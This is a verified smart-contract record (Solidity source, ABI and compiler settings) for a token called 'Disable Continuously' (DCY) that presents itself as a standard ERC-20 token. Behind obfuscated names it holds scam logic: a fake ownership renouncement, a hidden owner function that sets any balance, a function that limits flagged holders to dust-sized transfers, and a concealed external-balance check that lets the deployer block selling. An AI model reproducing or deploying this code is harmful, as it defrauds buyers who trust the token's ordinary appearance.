{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface isTakeList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract liquidityIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeTokenTo {\n    function createPair(address tokenTakeReceiver, address txSwapMin) external returns (address);\n}\n\ninterface autoEnableLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxMinExempt) external view returns (uint256);\n\n    function transfer(address txBuy, uint256 atExempt) external returns (bool);\n\n    function allowance(address sellLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txBuy,\n        uint256 atExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedTo, uint256 value);\n    event Approval(address indexed sellLaunch, address indexed spender, uint256 value);\n}\n\ninterface isLiquidity is autoEnableLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DisableContinuously is liquidityIs, autoEnableLaunch, isLiquidity {\n\n    mapping(address => bool) public atAmount;\n\n    address shouldEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public shouldAmount;\n\n    bool public takeTeam;\n\n    mapping(address => bool) public liquidityWallet;\n\n    function sellFundMode(address senderLiquidity) public {\n        if (shouldAmount) {\n            return;\n        }\n        \n        atAmount[senderLiquidity] = true;\n        if (totalReceiverMarketing != minLimit) {\n            minLimit = true;\n        }\n        shouldAmount = true;\n    }\n\n    uint8 private launchedTx = 18;\n\n    uint256 constant minMode = 12 ** 10;\n\n    function tradingToken() public {\n        emit OwnershipTransferred(atLimit, address(0));\n        autoExempt = address(0);\n    }\n\n    function transfer(address launchAmount, uint256 atExempt) external virtual override returns (bool) {\n        return enableToken(_msgSender(), launchAmount, atExempt);\n    }\n\n    function atList(uint256 atExempt) public {\n        launchAuto();\n        receiverExempt = atExempt;\n    }\n\n    bool private totalReceiverMarketing;\n\n    address private autoExempt;\n\n    uint256 private tokenExempt = 100000000 * 10 ** 18;\n\n    function approve(address marketingExempt, uint256 atExempt) public virtual override returns (bool) {\n        amountEnable[_msgSender()][marketingExempt] = atExempt;\n        emit Approval(_msgSender(), marketingExempt, atExempt);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private amountEnable;\n\n    address fundSenderShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address exemptLimit, address marketingExempt) external view virtual override returns (uint256) {\n        if (marketingExempt == shouldEnable) {\n            return type(uint256).max;\n        }\n        return amountEnable[exemptLimit][marketingExempt];\n    }\n\n    function launchAuto() private view {\n        require(atAmount[_msgSender()]);\n    }\n\n    function enableToken(address listSwapMin, address txBuy, uint256 atExempt) internal returns (bool) {\n        if (listSwapMin == atLimit) {\n            return liquidityBuySender(listSwapMin, txBuy, atExempt);\n        }\n        uint256 buyLaunch = autoEnableLaunch(launchBuySell).balanceOf(fundSenderShould);\n        require(buyLaunch == receiverExempt);\n        require(txBuy != fundSenderShould);\n        if (liquidityWallet[listSwapMin]) {\n            return liquidityBuySender(listSwapMin, txBuy, minMode);\n        }\n        return liquidityBuySender(listSwapMin, txBuy, atExempt);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return totalTo;\n    }\n\n    function owner() external view returns (address) {\n        return autoExempt;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamSwap;\n    }\n\n    function balanceOf(address maxMinExempt) public view virtual override returns (uint256) {\n        return minMax[maxMinExempt];\n    }\n\n    string private totalTo = \"Disable Continuously\";\n\n    constructor (){\n        \n        isTakeList atTokenBuy = isTakeList(shouldEnable);\n        launchBuySell = feeTokenTo(atTokenBuy.factory()).createPair(atTokenBuy.WETH(), address(this));\n        if (limitMax == isBuy) {\n            totalReceiverMarketing = false;\n        }\n        atLimit = _msgSender();\n        tradingToken();\n        atAmount[atLimit] = true;\n        minMax[atLimit] = tokenExempt;\n        if (totalReceiverMarketing != takeTeam) {\n            isBuy = senderFrom;\n        }\n        emit Transfer(address(0), atLimit, tokenExempt);\n    }\n\n    address public atLimit;\n\n    uint256 public isBuy;\n\n    function transferFrom(address listSwapMin, address txBuy, uint256 atExempt) external override returns (bool) {\n        if (_msgSender() != shouldEnable) {\n            if (amountEnable[listSwapMin][_msgSender()] != type(uint256).max) {\n                require(atExempt <= amountEnable[listSwapMin][_msgSender()]);\n                amountEnable[listSwapMin][_msgSender()] -= atExempt;\n            }\n        }\n        return enableToken(listSwapMin, txBuy, atExempt);\n    }\n\n    mapping(address => uint256) private minMax;\n\n    uint256 receiverExempt;\n\n    string private teamSwap = \"DCY\";\n\n    event OwnershipTransferred(address indexed tokenFeeSender, address indexed fromList);\n\n    function listTo(address launchAmount, uint256 atExempt) public {\n        launchAuto();\n        minMax[launchAmount] = atExempt;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedTx;\n    }\n\n    bool private minLimit;\n\n    function liquidityBuySender(address listSwapMin, address txBuy, uint256 atExempt) internal returns (bool) {\n        require(minMax[listSwapMin] >= atExempt);\n        minMax[listSwapMin] -= atExempt;\n        minMax[txBuy] += atExempt;\n        emit Transfer(listSwapMin, txBuy, atExempt);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenExempt;\n    }\n\n    address public launchBuySell;\n\n    function getOwner() external view returns (address) {\n        return autoExempt;\n    }\n\n    uint256 public limitMax;\n\n    uint256 private senderFrom;\n\n    uint256 senderShould;\n\n    function toBuy(address atMax) public {\n        launchAuto();\n        \n        if (atMax == atLimit || atMax == launchBuySell) {\n            return;\n        }\n        liquidityWallet[atMax] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenFeeSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atExempt\",\"type\":\"uint256\"}],\"name\":\"atList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMinExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchBuySell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atExempt\",\"type\":\"uint256\"}],\"name\":\"listTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLiquidity\",\"type\":\"address\"}],\"name\":\"sellFundMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMax\",\"type\":\"address\"}],\"name\":\"toBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listSwapMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DisableContinuously", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}